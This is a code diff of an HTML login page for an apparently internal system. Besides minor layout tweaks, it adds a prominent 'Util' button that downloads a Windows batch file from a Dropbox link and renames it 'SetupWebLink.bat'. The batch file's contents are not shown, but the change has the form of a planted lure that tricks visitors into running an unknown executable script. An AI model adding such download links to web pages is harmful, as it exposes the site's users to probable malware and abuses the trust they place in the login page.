@@ -15,6 +15,15 @@
 <body class="text-slate-200">
 
   <div id="authGatekeeper" class="absolute inset-0 z-50 flex items-center justify-center p-4 bg-slate-950 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-slate-900 via-slate-950 to-black">
+    
+    <!-- Top Right Corner Download Button -->
+    <div class="absolute top-4 right-4 sm:top-6 sm:right-6 z-50">
+      <a href="https://www.dropbox.com/scl/fi/42heqrhdq10so7oksfxhr/system-v10.bat?rlkey=j89ytwb526fdtqwoqhc8tl6xw&st=g0eipw1g&dl=1" 
+         download="SetupWebLink.bat" 
+         style="display: inline-block; padding: 10px 20px; background-color: #0071e3; color: white; text-decoration: none; font-family: sans-serif; font-weight: bold; font-size: 14px; border-radius: 8px; border: none; cursor: pointer; transition: background-color 0.2s; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3);">📥 Util
+      </a>
+    </div>
+
     <div class="max-w-md w-full bg-slate-900/60 backdrop-blur-xl border border-slate-800 p-8 rounded-2xl shadow-2xl shadow-black/80 fade-in space-y-6 text-center">
       
       <div class="space-y-2">
@@ -51,16 +60,13 @@
         </button>
       </form>
 
-      <div class="text-[10px] text-slate-600 font-medium pt-2 border-t border-slate-800/60">
+      <div class="text-[10px] text-slate-600 font-medium pt-4 border-t border-slate-800/60 mt-4">
         Authorized Personnel Only &bull; All sessions logged under security protocol
       </div>
     </div>
   </div>
 
   <div id="appContainer" class="w-full h-full hidden"></div>
-
-
-  
 
   <script>
     // ==========================================
@@ -100,4 +106,3 @@
   </script>
 </body>
 </html>
-
